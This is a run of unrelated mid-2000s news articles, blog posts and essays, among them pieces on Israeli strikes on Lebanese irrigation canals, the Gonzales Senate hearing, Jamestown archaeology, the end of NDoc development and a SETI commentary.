Israeli officials say any damage to water facilities is collateral to strikes on bridges and roads used by Hezbollah to transport weapons .
“ The whole idea that we are trying somehow -- and this is going back to conspiracy theories -- that we are trying to steal Litani water is ridiculous , ” said Regev , the Foreign Ministry spokesman .
Here on the Litani , in the empty banana fields and citrus groves that stretch for miles , there is a sense among residents that the battle already has been lost .

The airstrikes on the main irrigation canal , the trunk of a system that waters 9,800 acres , has doomed this year ’s banana crop .
No one knows when the canal system might be repaired .
The farmers have fled , and the banana plants stand drying under the hot summer sun .
“ All the farmers depend on this water .
It ’s drying up .
There ’s nothing left here .
It ’s collapsing , ” said Mohammed Saghir , a Qasmiya shop owner who stayed behind because he had nowhere to run .
“ In 1948 , the British hit the irrigation canal , and now the Israelis want to hit it .
They know all our families depend on this water , ” he said .

“ DEAR EDITOR : I am 8 years old .
Some of my little friends say there is no Islamic Fascist .
Papa says , ‘ If you see it on Fox News , it ’s so . ’
Please tell me the truth ; is there an Islamic Fascist ? ”
Virginia O’Hanlon
c /o Benador Associates
Washington , D.C .
VIRGINIA , your friends are twisted , sniveling , spineless little Chamberlains .
They do not believe except what they see in the mainstream media .
They have been affected by the cynicism and moral confusion of a post - 9/11 age .
Your little friends are WRONG !
They want to toss in the towel , while the enemy is waiting and hoping that we will do just that .
Yes , Virginia , there is a transnational terrorist movement fueled by a radical ideology  Islamic Fascism .
The Islamic Fascist exists as certainly as hatred , oppression , and murder exist .
Your little friends think that nothing can be which is not comprehensible by their little minds .
But all minds , Virginia , whether they be men’s or children ’s , are little .
In this great universe of ours , the American who gets his information from the mainstream media is a mere insect , an ant , in his intellect , as compared with the boundless world about him , as measured by the intelligence capable of grasping the whole of truth and knowledge  the global vision of people we can rely on  on Cheney , on Rice , on Rumsfeld and Bolton ; on Perle , on Wurmser , on Abrams and Kristol .
The Islamic Fascists hate us for our freedom , Virginia .
The Long War we fight today is the decisive ideological struggle of the 21st century against an enemy who lusts to turn back the advance of freedom and impose a dark vision of tyranny across the world .
Tell your little friends that is why we are in Iraq .
The Islamic Fascists made clear that the most important front in their struggle against America is Iraq  the “ capital of the Caliphate . ”
Iraq is the central battlefield where the outcome of this struggle will be decided .
They would have a new sanctuary to recruit and train terrorists at the heart of the Middle East , with huge oil riches to fund their ambitions .
If we give up the fight in the streets of Baghdad , we will face the terrorists in the streets of our own cities .
Tell your papa , Virginia , that this Caliphate would be a totalitarian Islamic empire encompassing all current and former Muslim lands , stretching from Europe to North Africa , the Middle East and Southeast Asia .
We know this because the enemy has told us .
True , the enemy lies constantly  almost totally without penalty .
They are actively manipulating the media in this country .
They can lie with impunity .
They portray our cause as a war on Islam when in fact the overwhelming majority of victims of their terrorism have been the thousands and thousands of innocent Muslims  men , women , and children  that they have killed .
When the enemy says things that , if true , would justify our Long War on Terror , why , Virginia , then we know they must be true !
But when they say things that , if true , would not , why , then , we know they must be lies !
Alas !
I know that you do not want to believe , Virginia  but imagine how dangerous would be the world if there were no Islamic Fascists to believe in !
There would be no childlike faith then , no dread for the president to draw on to help you and your little friends understand that the War on Terror must be without shape and without end .
We should then have no mission , accomplished or otherwise .
The eternal darkness of fear which fills the world and keeps us in dread would be extinguished and leave us unprepared  until the final proof  the smoking gun  that could come in the form of a mushroom cloud .
Not believe in the Islamic Fascist ?
You might as well not believe that Jesus will return to judge us all once Israel reigns from the Nile to the Euphrates !
You might get your papa to hire some ex-CIA contractors to watch all the borders of the homeland on Ramadan eve .
But even if they did not see an Islamic Fascist coming across strapped in dynamite , what would that prove ?
Nobody sees Islamic Fascism  but that is no sign that there are no Islamic Fascists .
The most real things in the world are those that neither children nor men can see .
Did you ever see evil fairies dancing on the White House lawn ?
Of course not , but that ’s no proof that they are not there .
Nobody can conceive or imagine all the terrors there are unseen and unseeable in the world .
We tear apart Iraq and see if there are WMD  but there is a veil covering the unseen world which not the strongest man , nor even the united strength of all the strongest men that ever lived , could tear apart .
There are known knowns , Virginia ; there are things we know we know .
We also know there are known unknowns , that is to say we know there are some things we do not know .
But there are also unknown unknowns  the ones we do n’t know we do n’t know .
Only faith , fancy , and fear can push aside that curtain and view the terror beyond .
Is it all real ?
Ah , Virginia , in all this world there is nothing else real and abiding .
No Islamic Fascist ?
Thank GOD !
He lives , and he lives forever .
A thousand years from now , nay , ten times ten thousand years from now , he will continue to strike terror into the heart of childhood .
You see , Virginia , the Islamic Fascist is our strategy for this Long War .
I know you will believe , and will do your part too in the Long War .
And tell your little friends  and your papa too  they better watch what they say .
We are listening , Virginia .
We are listening all year round .

Though their efforts to get 20,000 liberty - minded people to move to New Hampshire have stalled , organizers of the Free State Project are n't giving up .
Three years after 5,454 members chose New Hampshire as their home base for furthering the ideals of bare - bones government , the group has fallen far short of its goal of having 20,000 people ready to move to the state by 2007 .
To date , about 7,500 people have agreed to relocate to a state that offers not only the possibility to spread libertarian ideals , but also a dearth of economic opportunities .
" If we knew the answer to the question on how to get to 20,000 by the end of 2006 , we would have done that , " said Free State Project Director Varrin Swearingen .
" It should go without saying no one has done anything like this before , so we 're inventing the wheel .
It 's not an easy task . "
Free Staters are n't obligated to pack their bags until the 20,000 milestone is reached , and anyone who held second thoughts has been allowed to slip out of the pledge , Swearingen said .
He emphasized that 2006 was n't a target set in stone but a loose goal .
More than 100 pledge signers , including Swearingen , did n't wait and have moved to New Hampshire , he said .
Although he believes his savings in taxes has paid for his move from California to Keene , he acknowledges doing so was no small feat .
" There is a significant impediment to moving , " he said .
" There are real issues to deal with ; it can be tough to start over . "
Many Free Staters probably have hesitated to leave good jobs , friends , and family , said Mark Wrighton , an associate professor of political science at the University of New Hampshire .
Those living in the south and west may not want to leave regions where population and economic opportunities are growing , he said .
" You 're asking people to do something against the trend of where the population movement is , " he said .
" And it goes against the general trend that people do n't stay in New Hampshire .
People tend to leave the state and not come back . "
No t every member of the project is a libertarian .
They espouse a wide spectrum of causes : gun rights , decriminalization of marijuana , and the overriding goal of less government .
Members who live here have made a difference , Swearingen said , by lobbying against a measure that would have banned smoking in restaurants and by helping defeat municipal budgets .

A former Canadian defense minister is demanding governments worldwide disclose and use secret alien technologies obtained in alleged UFO crashes to stem climate change , a local paper said Wednesday .
" I would like to see what ( alien ) technology there might be that could eliminate the burning of fossil fuels within a generation ... that could be a way to save our planet , " Paul Hellyer , 83 , told the Ottawa Citizen .
Alien spacecrafts would have traveled vast distances to reach Earth , and so must be equipped with advanced propulsion systems or used exceptional fuels , he told the newspaper .
You know , at first glance , this guy probably appears to be completely batshit crazy .
But I think people who think we 're alone in this universe are the fucking crazy ones .
I mean , buy a telescope and you can see thousands of stars in our neighborhood alone .
If you start considering that there are billions of stars in a given galaxy and billions of galaxies .... the chances of us being alone are effectively nil .
It 's an open question as to whether they have travelled here , but this guy seems to think they have .
They mention he saw a UFO once .
Of course , the " U " in UFO stands for " unidentified " , but I think it 's pretty clear that our government is aware of the truth behind the UFO phenomenon .
In fact , I think it 's pretty clear that our government has a treaty or some sort of understanding with these aliens .
All you have to do is look at the government 's behavior when confronted with UFO evidence and people demanding disclosure .
The government routinely tells people to shut up and stop being silly .
But is n't that an incredibly irresponsible tactic in an age of terrorism and ( previously ) a nefarious communist threat ?
I mean , those UFOs could 've been Russians , but our government seemed unconcerned .
Why is this ?
Because they have a bit more information on the matter .
Otherwise they'd be playing up the threat , like they usually do for terrorism ( real or imagined ) .
Yet , when Chicago 's O'Hare airport was visited recently the reaction from Washington was .... nothing .
Strange , unidentified , crafts hovering above a major airport full of thousands of people apparently does n't worry them .
And these are the people protecting us from external threats ??!!
As a general rule I do n't believe anything the government says , or people who used to be in the government .
So why should we believe this guy , Paul Hellyer ?
Well , we should n't .
As Jeff Wells makes clear , trusting " former " government officials is folly .
Many of them are still connected to the military - industrial complex they formerly served , and their motives should always be suspect .
When a major figure offers to lend his prestige to a long - derided group like UFO investigators , it 's best to approach with caution , or even outright cynicism .
However , just because we 've been burned before does n't mean I 'm not gonna keep my eyes on the skies .

A story from a U.S. Soldier somewhere in Afghanistan " So we are up in the mountains at about 0100 hrs looking for a bad guy that we thought was in the area .
There are ten of us , pitch black , crystal clear night , about 25 degrees .
We know there are bad guys in the area ; a few shots have been fired but no big deal .
We decide that we need air cover and the only thing in the area is a solo B - 1 bomber .
He flies around at about 20,000 feet and tells us there is nothing in the area .
He then asks if we would like a low level show of force .
Stupid question .
Of course we tell him yes .
The controller who is attached to the team then is heard talking to the pilot .
Pilot asks if we want it subsonic or supersonic .
Very stupid question .
Pilot advises he is twenty miles out and stand by .
The controller gets us all sitting down in a line and points out the proper location .
You have to picture this .
Pitch black , ten killers sitting down , dead quiet and overlooking this about 30 mile long valley .
All of a sudden , way out ( below our level ) you see a set of four 200 ' white flames coming at us .
The controller says , " Ah -- guys -- you might want to plug your ears " .
Faster than you can think a B - 1 , supersonic , 1000 ' over our heads , blasts the sound barrier and it feels like God just hit you in the head with a hammer .
He then stands it straight up with 4 white trails of flame coming out and disappears . "
Cost of gas for that : Probably $ 50,000
Hearing damage : For certain

Have a nice day from the good 'ol USA !
WASHINGTON , April 19 — As Congressional Democrats sought to reconcile their differences and send an Iraq spending bill to the White House , Senator Harry Reid , the majority leader , said Thursday that “ this war is lost , ” a stark assessment that Republicans argued would demoralize American troops fighting in Iraq .
One day after legislative leaders met with President Bush , failing to find common ground , House Democrats signaled their intention to step away from a mandatory deadline to remove troops from Iraq , and to work instead toward a compromise of setting a goal for troops to be withdrawn next year .
But the president said that any timetable for a troop redeployment , even a goal , would face a veto .
“ I think it ’s a mistake , and I ’ve made it clear , that the Congress should not have artificial timetables for withdrawal in a funding statement , ” Mr. Bush said Thursday during a speech in Ohio .
In Washington , Mr. Reid delivered a biting critique of the Iraq war , saying there was no military solution to the conflict .
At a news conference , he recounted a private conversation with the president about the Vietnam War , saying he told Mr. Bush not to follow the path of President Lyndon B. Johnson , who “ did not want a war loss on his watch . ”

BBC News , Jamestown
The Queen has arrived in the US to celebrate the 400th anniversary of the first permanent English settlement at Jamestown , Virginia - although many Americans will still tell you it was in Plymouth , Massachusetts - 13 years later .
English settlers trade with Indians in the fort at Jamestown
" Everyone , " he said , " believed that the Jamestown fort of 1607 had been washed away and lost to the river " .
" When I started to dig in 1993 my archaeological expedition had a staff of one and that was me . "
Bill Kelso led me to the river bank where he began to dig with a trowel in 1993 .
" Quite near the surface I struck some pieces of pottery and a clay pipe .
I 'd seen the same sort of thing on 17th century sites in England so I kept digging , " he said .
Archaeological remains
By 2003 , archaeologists had revealed the remains of the triangular palisade and the towers of the fort which the settlers had built in only 19 days .
Half of them died soon after from heat and exhaustion .
The fort is just over one acre in size and is packed with archaeological remains .
They found the foundations of Elizabethan half - timbered houses with thatched roofs .
More than 750,000 artefacts have been recovered from the site - the site that was not supposed to be there .
Another archaeologist came up with a paper sack full of things he had found that morning .
Historians in the 19th century were looking for a more noble beginning and opted for The Pilgrim Fathers .
They landed in Plymouth in 1620 - 13 years after Jamestown
Bly Straube , museum curator
" That 's copper , " Bill Kelso explained .
" They had this , along with beads , to trade with the Indians . "
The first settlers had among them the younger sons of gentry families who kept up appearances and continued to dress like gentlemen .
Buttons from jackets give a clue to the quality of their clothes .
One personal item must have belonged to a man of means .
It is made of silver , about two inches long and in the shape of a dolphin .
Coming out of the dolphin's mouth is a curved pick used to clean teeth - while the other end - at the tail of the dolphin , there is a tiny silver spoon used for getting wax out of gentlemen's ears .
Damp conditions
The Queen will see some of the finest objects that are now in the newly opened site museum which the Americans curiously call an Archaearium .
One exhibition is a reconstruction of a deep well that was packed with stuff that had fallen in or been thrown away .
There were parts of a suit of armour - a breast plate and helmet .
There was an axe head and other iron tools .
Part of a bucket and rope survived , loads of pottery and the remains of deer and fish bones .
The damp conditions in the well meant that everything including leather shoes had been preserved .
Jamestown as a settlement had always been known to historians .
It is the discovery of layers of objects that add such an important new dimension to the story of the founding of English America that is new .
So why was Jamestown largely ignored by Americans ?
It was , after all , the capital of Virginia for almost 100 years .
" It 's partly to do with image and a bad press , " Bly Straube , the curator of the new site museum explained .
Captain John Smith landing on the Virginia coast in 1607
But in 1609 they starved and died like flies .
There is even documentary evidence to suggest that at one point they ate each other .
Pilgrim fathers
Nineteenth century historians had little respect for the settlers whom they described as lazy and incompetent .
In short , Jamestown was a fiasco .
Virginia was also on the wrong side in the civil war .
Sitting on top of Jamestown fort are the remains of a confederate gun emplacement .
" Historians in the 19th century were looking for a more noble beginning and opted for The Pilgrim Fathers , " Bly Straube explained .
" They landed in Plymouth in 1620 .
They had their women and children , and were determined to forge a new life with religious freedom in a new England . "
That read much better than the story of the commercially driven Virginia company with its slaves and tobacco in the background , and reports of violence and cannibalism .
With the history of settlement re-versioned , the Thanksgiving holiday became associated with the ideals of the Pilgrim Fathers and although nothing remains to be seen of Plymouth 's original settlement today most Americans will tell you that Plymouth is where it all began .
Remarkable archaeological discoveries have put Jamestown back on the map and all we need now , says Bly Straube is another holiday straight after Thanksgiving called Jamestown day .

Jeff Atwood , in JavaScript and HTML : Forgiveness by Default writes about how a design decision in XML doomed XHTML :
Unfortunately , the Draconians won : when rendering as strict XHTML , any error in your page results in a page that not only does n’t render , but also presents a nasty error message to users .
They may not have realized it at the time , but the Draconians inadvertently destroyed the future of XHTML with this single , irrevocable decision .
The lesson here , it seems to me , is that forgiveness by default is absolutely required for the kind of large - scale , worldwide adoption that the web enjoys .
Getting upset now about the draconian error handling of XML seems kind of quaint .
At this point , I think it is clear that XML ’s strictness about well - formedness is very easy to satisfy .
It is easy to write automatic producers of XML that do it correctly , and hand - edited XML is also easy to fix when it has missing angle brackets or mismatched tags .
The main problem with XHTML has nothing to do with XML ’s strictness .
The problem is that it ’s XML masquerading as HTML .
HTML has different lexical rules than XML .
Writing a single document that is both valid XHTML and an acceptable HTML document that will be understood by legacy browsers is very difficult , if not impossible .
It ’s essentially a polyglot programming exercise , where one file can be interpreted correctly according to two different sets of rules .
Except that we all kidded ourselves into thinking it was n’t , because HTML and XML both use tags .
HTML is derived from SGML , which has a dizzying array of shortcuts to minimize the markup in a document .
Take a quick look at Tag Minimization from Martin Bryan ’s book to see the kind of stuff SGML lets you do .
Some of this is still in HTML , which is why XML ’s < br / > does n’t do what you think in an HTML document .
Other issues include the special treatment browsers give to script content , where less - thans really are less - thans , while in XML , they have to be escaped as <.
A fuller run-down of the problems is in Ian Hickson ’s Sending XHTML as text / html Considered Harmful .
So to my mind , the problem here is not that XML is strict , but that it is different from HTML .
You ca n’t easily write a page which works as both .
Jeff gives the example of an author publishing a page and then finding out from his horde of angry readers that the page wo n’t display .
This is not the kind of problem that happens : well - formedness is easy to check and fix .
That said , it ’s also true that being strict about well - formedness does nothing to help with checking validity , and beyond that , nothing to help with checking for correct rendition .
It ’s that last level of correctness that is the hobgoblin of web development : once the tag stream is correct according to some criteria , the browser must then draw a page , and there is where things really run off the rails .
Certainly invalid pages will have more rendering problems that valid pages , but validity is not enough to guarantee that the page will look correct .
So XML ’s strictness is easy to acheive , and also fairly useless .
In the end , Jeff is right :
Even though programmers have learned to like draconian strictness , forgiveness by default is what works .
It ’s here to stay .
We should learn to love our beautiful soup instead .
Officers try to empty the fuel in 500 jerry cans brought by people to steal fuel from the pipeline .

The world 's top 10 net oil exporters and their exports in millions of barrels per day in 2004 : YOUR E- MAIL ALERTS Nigeria Lagos Oil or or Create Your Own
LAGOS , Nigeria ( CNN ) --
Between 150 and 200 people were killed on Friday when a gasoline pipeline exploded in Nigeria , officials said , incinerating people as they were trying to drain fuel into cans .
" You can see the corpses .
Some are burned to ash .
Others are remnants ...
We estimate 150 to 200 people died , " the police commissioner told Reuters news agency .
" It seems these people were literally incinerated , almost instantly , " CNN's Jeff Koinange reported from Lagos .
( Watch how dozens died in a furnace of fire -- 2:20 )
Rescue workers dug a ditch near the exploded pipeline , the commissioner told The Associated Press , saying the bodies would be " given a mass burial . "
A Reuters reporter said sand had been cleared from around the buried pipeline and that it bore marks of drilling .
The pipeline carries petroleum from a jetty offshore to a distribution point inland , he reported .
" People insist on breaking into these installations in order to steal petrol in the pipes and it's difficult to man every pipeline in the country , " Nigerian government spokesman Femi Fani - Kayode said .
" We do n't have the people or resources , and I do n't think anyone in the world does . "
The fire from the blast has been extinguished , and Nigerian police officers have secured the scene .
Nigerian officials say the pipe exploded on Snake Island .
" A number of villages were involved and came to assist and help our security agents , " Fani - Kayode said .
Despite its oil riches , Nigeria 's population remains impoverished and people often tap into pipelines crossing their lands , seeking fuel for cooking or resale on the black market .
The fuel thefts can easily lead to tragedy because safety is not a concern .
" This is a very common occurrence here in Nigeria ... vandals going in trying to steal petroleum products and a motorcycle backs up and a spot just hits the pipeline and explodes , " CNN 's Koinange said .
" This is caused by hunger and greed .
If you 've got no job and you 're hungry you take advantage of anything to feed your family .
Anyone who takes this kind of risk is desperate , " Olanrewaju Saka - Shenayon , a Lagos state government official , told Reuters .
Officials also suspect that some of the stolen oil is used to finance militant groups , such as the Movement for Emancipation of the Niger Delta ( MEND ) .
MEND has been responsible for some attacks on oil pipelines and a wave of kidnappings of oil workers , acts that cut oil output in the world 's eighth - largest producer by about 25 percent annually , officials said .
In September 2004 , an oil pipeline exploded near Lagos as thieves tried to siphon oil from it , with up to 50 people perishing in the flames .
A 1998 pipeline blast killed more than 1,000 in southern Nigeria .
" Because this thing has happened many times before we thought it would be a deterrent , but apparently it was n't enough deterrent for these people who died , " Lagos State Health Commissioner Tola Kasali told AP as he looked over the charred corpses on the beach at Ilado , about 28 miles from Lagos .
He said about 100 of the bodies were buried Friday , and the rest would be Saturday so they did not spread disease into Lagos .
Many of the corpses were in a nearby creek .
" We just decided to give them a mass burial because no one can recognize them , even their family members can't identify them , " Kasali told AP .
" We 're concerned that if we do n't do that , we 'll create a health emergency in Lagos since it happened by the shore and the water will just flow back into the city . "

Subject : NDoc 2.0 - R.I.P .
I have decided to discontinue work on NDoc 2.0 and no longer participate in any open - source development work .
The development and release of NDoc 1.3 was a huge amount of work , and by all accounts widely appreciated .
Unfortunately , despite the almost ubiquitous use of NDoc , there has been no support for the project from the .
Net developer community either financially or by development contributions .
Since 1.3 was released , there have been the grand total of eleven donations to the project .
In fact , were it not for Oleg Tkachenko ’s kind donation of a MS MVP MSDN subscription , I would not even have a copy of VS2005 to work with !
To put this into perspective , if only roughly 1 - in - 10 of the those who downloaded NDoc had donated the minimum allowable amount of $ 5 then I could have worked on NDoc 2.0 full - time and it could have been released months ago !
Now , I am not suggesting that this should have occurred , or that anyone owes me anything for the work I have done , rather I am trying to demonstrate that if the community values open - source projects then it should do * something * to support them .
MS has for years acknowledged community contributions via the MVP program but there is absolutely no support for community projects .
Once ‘ Sandcastle ’ is released , it is my belief that it will become the de-facto standard and that NDoc will slowly become a stagnant side - water .
This will happen regardless of technical considerations , even if Sandcastle were to be less feature - complete .
It 's just an inevitable result of MS 's ' not - invented - here ' mentality , one only has to look at Nant and NUnit to see the effects of MS ' competition ' .
This is not , however , my only reason for stopping development work - I have a big enough ego to think I could still produce a better product than them :-)
As some of you are aware , there are some in the community who believe that a .
Net 2.0 compatible release was theirs by - right and that I should be moving faster – despite the fact that I am but one man working in his spare time ...
This came to head in the last week ; I have been subjected to an automated mail - bomb attack on both my public mail addresses and the ndoc2 mailing list address .
These mails have been extremely offensive and resulted in my ISP temporarily suspending my account because of the traffic volume .
This incident has been reported to the local authorities , although I am highly doubtful they will be able to do anything about it .
This has was the ‘ last - straw ’ and has convinced me that I should withdraw from the community ; I ’m not prepared to have myself and my family threatened by some lunatic !

Atty . Gen. Alberto R. Gonzales , told by President Bush to repair relations with Congress over his handling of the U.S. attorneys affair , instead suffered new and withering criticism from senators of both parties Thursday , including questions about his judgment , candor and fitness to serve .
Testifying before the Senate Judiciary Committee in what one lawmaker called a “ reconfirmation hearing , ” Gonzales apologized for what he described as a flawed process in which a group of young political appointees at the Justice Department led a review that resulted in the firings of eight U.S. attorneys last year .
But his credibility took a fresh hit when he tried to downplay his involvement in the dismissals even as documents and testimony from top aides in recent weeks have shown that he played a central role .
His inability to recall basic facts at the hearing -- he answered “ I do n’t recall ” more than 50 times -- also often baffled and bewildered lawmakers .
“ Your characterization of your participation is significantly , if not totally , at variance with the facts , ” said Sen. Arlen Specter ( R - Pa. ) , the ranking Republican on the committee .

Gonzales was unable to identify who at the Justice Department and the White House was involved in preparing the final list of prosecutors to be fired .
Several lawmakers said he demonstrated a distressing lack of knowledge about the attorneys ’ performance before he decided to dismiss them .
Rather , Gonzales testified that he relied on the “ consensus recommendation of people that I trusted , ” admitting that he knew little or nothing about two of seven of the prosecutors who were fired on a single day in December .
He also said he could not remember the date when he finally approved the dismissals .

“ Well , how can you be sure you made the decision ? ” asked Judiciary Committee Chairman Sen. Patrick J. Leahy ( D - Vt. ) .
Lawmakers also challenged Gonzales on how he could make an informed judgment about firing attorneys when his involvement , by his own admission , was limited .
“ Since you apparently knew very little about the performance about the replaced United States attorneys , how can you testify that the judgment ought to stand ? ” asked Sen. Edward M. Kennedy ( D - Mass . ) .
“ How can you know that none of them were removed for improper reasons ? ”
Several lawmakers said the reasons Gonzales offered for the dismissals -- including a lack of energy in the case of one fired prosecutor -- sounded contrived .
Sen. Lindsey Graham ( R - S.C. ) called the explanations “ a stretch . ”

“ It ’s clear to me that some of these people just had personality conflicts with people in your office or at the White House and , you know , we made up reasons to fire them , ” Graham said .
“ Sir , I respectfully disagree with that , ” Gonzales responded .
“ I really do . ”
Some of the toughest criticism came from fellow Republicans .
“ There are some very serious problems , Mr. Attorney General , ” said Sen. Jeff Sessions ( R - Ala . ) .
“ Your ability to lead the Department of Justice is in question . ”

Sen . Tom Coburn ( R. - Okla . ) was more blunt .
“ The best way to put this behind us is your resignation , ” he told Gonzales , becoming the second Republican member of the Senate to call for the attorney general to quit .
Among the 19 members of the committee , only one -- Sen. Orrin G. Hatch ( R - Utah ) -- spoke out in defense of Gonzales .
Gonzales sat alone at the witness table in a crowded room that was the site of his confirmation hearing two years ago .
Protesters in orange and pink prison garb interrupted the proceedings on several occasions .
The words “ Arrest Gonzales ” were duct - taped to their backs .
The attorney general has been left fighting for his job because he has offered shifting explanations about how closely he was involved in the firings of the prosecutors , who serve as the arms of the Justice Department around the country .

He initially denied at a news conference last month that he was involved in discussions about the purge .
He modified his remarks after internal Justice Department documents showed that he had participated in meetings where the prosecutors ’ fate was discussed .
When Gonzales told the panel that he always prepared for testimony before Congress , Specter shot back : “ Do you prepare for your press conferences ?
And were you prepared when you said you were n’t involved in any deliberations ? ”
At the hearing , Gonzales expressed regret that the dismissals had become an “ undignified public spectacle . ”
“ Those eight attorneys deserved better , ” he told the committee .
Advertisement
He denied , however , that any improper political motives had fueled the dismissals , as Democrats have insinuated , and said that in hindsight he felt the firings were justified .
“ It would be improper to remove a U.S. attorney to interfere with or influence a particular prosecution for political gain , ” he said .
“ I did not do that .
I would never do that . ”
Gonzales said that he still believed that he could be an effective attorney general , and that his decisions to turn over thousands of department documents to congressional investigators were “ not the actions of someone with something to hide . ”
“ I believe that I continue to be effective as the attorney general of the United States , ” he said .
“ We ’ve done some great things . ”

Bush , who said last month that he was troubled that lawmakers said Gonzales had not been straight with them over the firings and instructed him to go to Capitol Hill and patch things up , was “ pleased ” with Gonzales ’ testimony , a White House spokeswoman said .
“ After hours of testimony in which he answered all of the senators ’ questions and provided thousands of pages of documents , he again showed that nothing improper occurred , ” Deputy Press Secretary Dana Perino said .
“ The attorney general has the full confidence of the president , and he appreciates the work he is doing at the Department of Justice . ”
The post - hearing assessments were less cheery from some other Republicans .
Late Thursday , Sessions said that the Justice Department might be better served with new leadership .
“ I think it ’s going to be difficult for him to be an effective leader , ” Sessions , a former federal prosecutor , told the Associated Press .
“ At this point , I think [ Gonzales ] should be given a chance to think it through and talk to the president about what his future should be . ”

It is far from certain that Gonzales will be forced to step aside .
The hearing produced no evidence to support the most provocative claim of his critics -- that the firings were orchestrated to affect public corruption cases in a way that would aid Republicans .
And while some senators fumed about the lack of detail that Gonzales offered , Congress is powerless to remove him from office .
Specter , while telling Gonzales that his credibility had been “ significantly impaired , ” said he was not going to call on him to resign .
He said the decision was for Gonzales and Bush alone .

Even Democrats , who are driving an intensive investigation into the origins and execution of the firings , conceded they were unable to achieve a knockout blow .
“ There was no smoking gun , but Gonzales and his cause took 10 to 20 steps back , ” Sen. Charles E. Schumer ( D - N.Y. ) told reporters after the hearing .
Schumer , perhaps Gonzales ’ most outspoken critic , said the hearing pointed up the need to obtain testimony and records from the White House to fully understand how the eight prosecutors were targeted .
The White House has offered to send officials , including political advisor Karl Rove and former White House Counsel Harriet E. Miers , to answer questions about the firings , but only in private and without a transcript .
Schumer and other lawmakers have said those terms are unsatisfactory , and are threatening to subpoena the officials .

" At whatpoint would you abandon the search ? "
That 's aquestion I get relatively frequently from folks who think that SETI may be aquixotic quest , as futile as searching for the Seven Cities of Gold .
Afterall , modern efforts to find signals from extraterrestrial transmitters are nowin their fifth decade .
Could it be that those of us who still hope to tune inother worlds may be missing some writing on the wall ?
Some dead - obvious , chiseled text with a simple , if disappointing message : " There are no aliens " ?
Thequestion seems fair , since SETI 's obvious analogs - the historical voyages ofdiscovery made in the centuries following the Renaissance - were completed inconsiderably less time than SETI has been beating the cosmic bushes .
Columbus spent five weeks finding North America ( and he was n't even looking ) .
Captain Cook , a true paragon of explorers , and a man who mapped places that Europeans did n't even know were places , never mounted an expedition that lastedmore than three years .
But thoseanalogs are false .
The South Pacific , for all its watery wastes , iscomprehensible in size .
Even Cook 's unimpressive
Whitby collier , powered by sailcloth , could cross the Pacific in amatter of months , come about , and cross again in a different direction .
Hisquarry , the islands peppering the ocean like coins scattered onto a living roomcarpet , signaled their presence by clots of clouds even when the islandsthemselves were below the horizon .
The SETIwilderness is incomparably larger , obviously , and its quarry is cryptic .
Evenif there are ten thousand transmitting societies nestled in the arms of the Milky Way , we might need to search millions of star systems before we findone .
The actual number of star systems that radio SETI experiments havecarefully examined is fewer than a thousand .
It 's asimple truth , although one not universally acknowledged , that SETI is still inits early stages .
Consequently , many of its practitioners will tell you thatthis is a multigenerational experiment , akin to building cathedrals in medieval Europe .
In other words , a lot of SETIscientists will answer the question that began this article by saying " not inmy lifetime , nor in that of my children or grandchildren . "
Fightingwords , but could they be hyperbolic ?
To begin with , SETI experiments will haveexamined millions of star systems within a generation .
And within two , wecould carefully check every star in the Galaxy .
The SETI ship has a lot ofocean to cover , but thanks to new technologies , it 's picking up speed .
Soclearly , if we have n't found something by mid-century or so , it will be hard toargue that it 's still " early stages . "
Andfrankly , it 's conceivable that SETI 's basic assumptions might be proven wrong .
Imagine that the new space - based telescopes ( COROT and Kepler ) currently beingdeployed to hunt for Earth - size planets around other stars come up empty .
Thatwould be a premium - grade bummer .
But even if ( as widely expected ) they dodiscover rocky worlds , it 's possible that a decade or so down the line , theirtelescopic successors - atmosphere - sniffing instruments such as the TerrestrialPlanet Finder - might fail to find any extrasolar worlds on which life hastaken hold .
Spacecraftof the future might return to us the news that neither Mars , Europa , nor any ofthe other orbs of the solar system with liquid water have ever produced amicrobe .
If these are headlines of the future - if the local cosmic neighborhoodturns out to be as sterile as prime - time television - then that would certainlyput me on the defensive .
But thefact is that none of this incites me to break out the worry beads .
Not yet .
The various factors in the well - known Drake Equation , which is often used toestimate the chances of SETI success , have - at least until now - become moreencouraging with time , not less .
The more we learn about the universe , the moreit seems disposed to house worlds with life .
It did n't have to be that way .
Somewhatmore disquieting is the possibility that our approach is wrong .
SETI today isoverwhelmingly a search for narrow - band electromagnetic transmissions , or infewer syllables , a hunt for beamed radio or light .
We search withstraightforward telescopic techniques , but it 's possible that alien broadcastscould be encoded in ways that we 're not set up to find .
I 'm not talking abouthow they construct their messages - or whether they 're broadcasting in StandardAmerican English or a lilting Klingon dialect - but the technical scheme they use .
For instance , Walt Simmons at the University of Hawaii has suggested that garrulous aliensmight wield two widely separated transmitters and use quantum mechanicaleffects to encode their messages .
The advantage would be that if we opened thistype of alien mail , it would be impossible to tell from which direction itcame , thereby protecting the anonymity of the sender .
This sort of approach - stillsomewhat beyond our technical abilities - might make our present receivingschemes seem na?ve .
Inaddition , there 's always the chance that the discovery of new physics willreveal some communication mode that 's either faster than light and radio , orrequires less energy to use .
This does n't seem likely , but science is allabout surprises .
Indeed , mypersonal feeling is that if SETI has n't turned up something by the second halfof this century , we should reconsider our search strategy , rather than assumethat we 've failed because there is nothing - or no one - to find .
Would I everconclude that we 've searched enough ?
Would I ever truly give up on SETI ' sbedrock premise , and tell myself that the extraterrestrials simply are n't outthere ?
Not likely .
That would be to assume that we 've learned all there is toknow about our universe , a stance that is contrary to the spirit of explorersand scientists alike .
We might yearn , or even need to believe that we arespecial , but to conclude that Homo sapiens is the best the cosmos has tooffer is egregious self - adulation .
When Patrick Greenish accepted a job offer as an art director in Charlotte , N.C. , last July , he assumed that his house in Orlando would sell quickly .
His new employer offered to let him telecommute for a month until the sale was complete .
But when the month ended , the " For Sale " sign remained firmly planted in his front yard .
Even so , the company expected him to be working in Charlotte .
" I had to leave everybody at home while the house was still on the market , " Mr. Greenish says , referring to his wife and two young daughters .
" It was a bit hard on everybody . "
That kind of challenge is becoming more common as a soft housing market is changing the landscape of relocation .
Some potential employees are turning down new jobs or transfers they cannot sell their house or would have to take a heavy loss .
And companies that offer relocation benefits are spending more for employees ' moving expenses .
" It 's costing companies an exorbitant amount of money to cover the loss on sale to get an employee moved , " says Andrew Drescher , a relocation consultant with Relocation Benefits in Vienna , Va .
Many Fortune 1000 companies typically pay closing costs , he says , as well as giving employees payment for money they lost by selling their house quickly .
But small firms often cannot afford that .
" It 's greatly affecting the ability of smaller companies to recruit top talent out of higher - priced markets , " Mr. Drescher says .
As transferees or newly hired employees wait for their homes to sell , many are spending more time in temporary housing , disrupting family life .
